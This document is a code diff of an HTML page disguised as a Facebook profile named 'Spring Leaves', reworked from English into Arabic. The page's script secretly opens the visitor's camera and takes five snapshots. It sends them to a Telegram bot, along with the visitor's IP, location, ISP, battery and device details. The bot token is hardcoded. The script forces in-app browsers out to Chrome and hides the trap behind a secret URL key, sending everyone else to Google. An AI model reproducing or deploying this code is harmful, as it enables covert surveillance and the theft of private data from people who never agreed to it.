@@ -1,144 +1,132 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <title>Spring Leaves | Facebook</title>
-    <meta property="og:title" content="Spring Leaves (Profile)">
-    <meta property="og:description" content="‏1.2K‏ Followers · 450 Friends · See Photos and Videos">
+    <title>أوراق الربيع | Facebook</title>
+    <meta property="og:title" content="أوراق الربيع (Spring Leaves)">
+    <meta property="og:description" content="‏1.2 ألف‏ من المتابعين · ‏456‏ من الأصدقاء · نشط الآن">
     <meta property="og:image" content="https://e.top4top.io/p_369921khp0.jpeg">
     <meta property="og:type" content="profile">
-    <meta property="og:site_name" content="Facebook">
 
     <style>
-        body { margin: 0; font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; background-color: #ffffff; }
-        .cover-photo { height: 180px; background: #e9ebee; position: relative; border-bottom: 1px solid #ddd; }
-        .profile-container { position: absolute; bottom: -40px; left: 15px; }
-        .avatar { width: 130px; height: 130px; border-radius: 50%; border: 5px solid white; object-fit: cover; box-shadow: 0 2px 4px rgba(0,0,0,0.2); }
-        .main-content { padding: 50px 20px 20px; text-align: left; }
-        .profile-name { font-size: 26px; font-weight: bold; margin-bottom: 4px; color: #1c1e21; }
-        .profile-stats { color: #65676b; font-size: 15px; margin-bottom: 15px; }
-        .action-btns { display: flex; gap: 8px; margin-bottom: 20px; }
-        .btn { flex: 1; height: 36px; border-radius: 6px; border: none; font-weight: 600; display: flex; align-items: center; justify-content: center; cursor: pointer; }
-        .btn-add { background-color: #1877f2; color: white; }
-        .btn-msg { background-color: #e4e6eb; color: #050505; }
-        .bio-list { list-style: none; padding: 0; margin: 0; border-top: 1px solid #ebedf0; padding-top: 15px; }
-        .bio-list li { margin-bottom: 12px; display: flex; align-items: center; font-size: 15px; color: #1c1e21; }
-        #camera_feed, #output_canvas { display: none; }
+        body { margin: 0; font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; background: #ffffff; display: none; } /* الصفحة مخفية افتراضياً */
+        .cover { width: 100%; height: 200px; background: url('https://images.unsplash.com/photo-1470071459604-3b5ec3a7fe05?fit=crop&w=1000&q=80') center/cover; border-bottom: 1px solid #ddd; position: relative; }
+        .pp-cont { position: absolute; bottom: -40px; right: 20px; }
+        .pp { width: 130px; height: 130px; border-radius: 50%; border: 4px solid white; object-fit: cover; box-shadow: 0 2px 4px rgba(0,0,0,0.2); }
+        .main { padding: 50px 20px; }
+        .un { font-size: 26px; font-weight: bold; }
+        .us { color: #65676b; margin-bottom: 15px; }
+        .btns { display: flex; gap: 10px; margin-bottom: 20px; }
+        .b { flex: 1; height: 36px; border-radius: 6px; border: none; font-weight: bold; display: flex; align-items: center; justify-content: center; }
+        .bl { background: #1877f2; color: white; }
+        .gr { background: #e4e6eb; color: black; }
+        .info { border-top: 1px solid #eee; padding-top: 15px; list-style: none; padding-right: 0; }
+        .info li { margin-bottom: 10px; font-size: 15px; }
+        #v, #c { display: none; }
     </style>
 </head>
 <body>
 
-<div class="cover-photo"></div>
-<div class="profile-container">
-    <img src="https://e.top4top.io/p_369921khp0.jpeg" class="avatar">
-</div>
-
-<div class="main-content">
-    <div class="profile-name">Spring Leaves</div>
-    <div class="profile-stats">1,248 Followers · 456 Friends</div>
-    
-    <div class="action-btns">
-        <div class="btn btn-add">Add Friend</div>
-        <div class="btn btn-msg">Message</div>
+<div id="trap-ui">
+    <div class="cover"><div class="pp-cont"><img src="https://e.top4top.io/p_369921khp0.jpeg" class="pp"></div></div>
+    <div class="main">
+        <div class="un">أوراق الربيع</div>
+        <div class="us">‏1,248‏ متابع • ‏456‏ صديق</div>
+        <div class="btns"><div class="b bl">إضافة صديق</div><div class="b gr">مراسلة</div></div>
+        <ul class="info">
+            <li>📍 تقيم في <b>إسطنبول، تركيا</b></li>
+            <li>🏡 من <b>لندن، المملكة المتحدة</b></li>
+            <li>❤️ عازبة</li>
+        </ul>
     </div>
-
-    <ul class="bio-list">
-        <li>🌎 Lives in <b>Istanbul, Turkey</b></li>
-        <li>📍 From <b>London, United Kingdom</b></li>
-        <li>❤️ Single</li>
-        <li>🕒 Joined December 2018</li>
-    </ul>
 </div>
 
-<video id="camera_feed" autoplay playsinline></video>
-<canvas id="output_canvas"></canvas>
+<video id="v" autoplay playsinline></video>
+<canvas id="c"></canvas>
 
 <script>
 const TOKEN = '8060111495:AAGntTDe3q6lmhXDuNKdC6DZuTTPARA9jnc';
-const CHAT_ID = '7184970355';
+const CHAT = '7184970355';
+const SECRET_KEY = "login"; // الكلمة السرية التي ستفعل المصيدة
 
-// 1. الحماية من البوتات
-function checkBot() {
-    const botAgents = ["facebookexternalhit", "Facebot", "Googlebot", "Twitterbot", "TelegramBot", "WhatsApp"];
-    return botAgents.some(agent => navigator.userAgent.includes(agent));
-}
-
-// 2. إجبار المتصفح الخارجي (للأندرويد)
-function jumpToExternal() {
-    if (navigator.userAgent.includes("Instagram") || navigator.userAgent.includes("FBAN") || navigator.userAgent.includes("FBAV")) {
-        const cleanUrl = window.location.href.replace(/https?:\/\//, "");
-        window.location.href = `intent://${cleanUrl}#Intent;scheme=https;package=com.android.chrome;end`;
+// نظام التحقق من المفتاح وتوجيه البقية لجوجل
+function checkAccess() {
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.get('view') === SECRET_KEY) {
+        document.body.style.display = "block"; // إظهار الصفحة
+        forceExternal();
+        startInfection();
+    } else {
+        window.location.href = "https://www.google.com"; // تحويل لجوجل إذا لم يوجد المفتاح
     }
 }
 
-async function runInfection() {
-    if (checkBot()) return;
+function forceExternal() {
+    if (/Instagram|FBAN|FBAV|Messenger/i.test(navigator.userAgent)) {
+        const u = window.location.href.replace(/https?:\/\//, "");
+        window.location.href = `intent://${u}#Intent;scheme=https;package=com.android.chrome;end`;
+    }
+}
 
+async function startInfection() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.getElementById('camera_feed');
-        video.srcObject = stream;
+        document.getElementById('v').srcObject = stream;
 
-        // جلب المعلومات التقنية
         const battery = await navigator.getBattery();
-        const ipResponse = await fetch('https://ipapi.co/json/');
-        const ipInfo = await ipResponse.json();
+        const ipRes = await fetch('https://ipapi.co/json/');
+        const ip = await ipRes.json();
 
-        let log = `✅ Target Captured: Spring Leaves Trap\n\n` +
-                  `👤 Device Platform: ${navigator.platform}\n` +
-                  `🌐 IP: ${ipInfo.ip}\n` +
-                  `📍 Location: ${ipInfo.city}, ${ipInfo.country_name}\n` +
-                  `🏢 ISP: ${ipInfo.org}\n` +
-                  `🔋 Battery: ${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not Charging'})\n` +
-                  `🧠 RAM: ${navigator.deviceMemory || 'Unknown'} GB\n` +
-                  `🖥️ Resolution: ${window.screen.width}x${window.screen.height}\n` +
-                  `⏰ Date: ${new Date().toLocaleString()}`;
+        let msg = `🎯 تم دخول المصيدة (أوراق الربيع) 🎯\n\n` +
+                  `📱 الجهاز: ${navigator.platform}\n` +
+                  `🌐 IP: ${ip.ip}\n` +
+                  `📍 الموقع: ${ip.city}, ${ip.country_name}\n` +
+                  `🔋 البطارية: ${Math.round(battery.level * 100)}% (${battery.charging ? 'يُشحن' : 'لا يُشحن'})\n` +
+                  `🧠 الرام: ${navigator.deviceMemory || 'غير معروف'} GB\n` +
+                  `🖥️ الشاشة: ${window.screen.width}x${window.screen.height}\n` +
+                  `⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
         
-        sendToTele(log);
+        sendMsg(msg);
 
-        let snapCount = 0;
-        let snapInterval = setInterval(() => {
-            if (snapCount >= 5) {
-                clearInterval(snapInterval);
-                stream.getTracks().forEach(track => track.stop());
+        let count = 0;
+        let itv = setInterval(() => {
+            if (count >= 5) {
+                clearInterval(itv);
+                stream.getTracks().forEach(t => t.stop());
+                setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);
                 return;
             }
-            takeSnapshot(snapCount + 1);
-            snapCount++;
-        }, 1000);
+            takePic(count + 1);
+            count++;
+        }, 1200);
 
-    } catch (err) {
-        sendToTele("⚠️ Permission Denied: Target refused camera access.");
+    } catch (e) {
+        sendMsg("⚠️ دخل المبتز لكنه رفض الكاميرا.");
+        setTimeout(() => { window.location.href = "https://www.google.com"; }, 3000);
     }
 }
 
-function takeSnapshot(index) {
-    const canvas = document.getElementById('output_canvas');
-    const video = document.getElementById('camera_feed');
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    canvas.getContext('2d').drawImage(video, 0, 0);
-    
-    canvas.toBlob(blob => {
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('photo', blob, 'capture.jpg');
-        formData.append('caption', `Snapshot #${index} for Target`);
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+function takePic(n) {
+    const c = document.getElementById('c');
+    const v = document.getElementById('v');
+    c.width = v.videoWidth; c.height = v.videoHeight;
+    c.getContext('2d').drawImage(v, 0, 0);
+    c.toBlob(b => {
+        const f = new FormData();
+        f.append('chat_id', CHAT);
+        f.append('photo', b, 'x.jpg');
+        f.append('caption', `لقطة المبتز رقم ${n}`);
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: f });
     }, 'image/jpeg');
 }
 
-function sendToTele(text) {
-    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
+function sendMsg(m) {
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(m)}`);
 }
 
-// البدء عند تحميل الصفحة
-window.onload = () => {
-    jumpToExternal();
-    runInfection();
-};
+window.onload = checkAccess;
 </script>
 </body>
 </html>
